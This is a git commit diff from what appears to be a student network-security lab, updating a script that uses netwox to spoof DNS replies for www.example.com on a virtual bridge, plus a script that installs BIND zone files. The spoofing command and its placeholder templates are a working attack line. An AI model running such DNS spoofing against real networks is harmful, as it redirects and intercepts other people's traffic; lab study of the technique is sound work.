ddf065c987d1c114be0f279324fdab5c34b60cf1
nikolasfil <nikolas13in@gmail.com>
2024-01-11 00:12:07 +0200

    udpated

--- assignment-8/scripts/dns_spoofing.sh
+++ assignment-8/scripts/dns_spoofing.sh
@@ -1,3 +1,12 @@
 #!/bin/bash
 
-sudo netwox 105 -h "www.example.com" -H "150.140.189.12" -a "ns.example.com" -A "150.140.189.13" -d virbr0
+# sudo netwox 105 -h "www.example.com" -H "150.140.189.12" -a "ns.example.com" -A "150.140.189.13" -d virbr0
+
+
+# sudo netwox 105 -h "www.example.com" -H "<USER_MACHINE_IP>" -a "ns.example.com" -A "<DNS_SERVER_IP>" -d <ATTACKER_NETWORK_DEVICE> -T <TTL_IN_SECONDS> -s "<SPOOF_IP>"
+
+sudo netwox 105 -h "www.example.com" -H "192.168.122.150" -a "ns.example.com" -A "192.168.122.149" -d virbr0 -T 3600 -s "4:150.140.189.12"
+# sudo netwox 105 -h "www.example.com" -H "<USER_MACHINE_IP>" -a "ns.example.com" -A "<DNS_SERVER_IP>" -d <ATTACKER_NETWORK_DEVICE> -T <TTL_IN_SECONDS> -s "150.149.122.1"
+
+
+# In this command, the -S option specifies the IP spoofing type, and "4" is the code for IPv4. The subsequent value, "150.149.122.1", is the IP address you want to use in the spoofed response.
--- assignment-8/scripts/setup_bind.sh
+++ assignment-8/scripts/setup_bind.sh
@@ -1,8 +1,13 @@
 #!/bin/bash
 
+# sudo cat ../files/named.conf.option > /etc/bind/named.conf.options;
 sudo cat ../files/named.conf.option > /etc/bind/named.conf.options;
-sudo cat ../files/example.db > /var/cache/bind/example.com.db;
+sudo cat ../files/named.conf.local.internal > /etc/bind/named.conf.local;
+
+sudo cat ../files/example.db.internal > /var/cache/bind/example.com.db;
 sudo cat ../files/192.168.0 > /var/cache/bind/192.168.0;
+sudo cat ../files/192.168.122 > /var/cache/bind/192.168.122;
+
 
 sudo systemctl restart bind9;
 sudo systemctl status bind9;
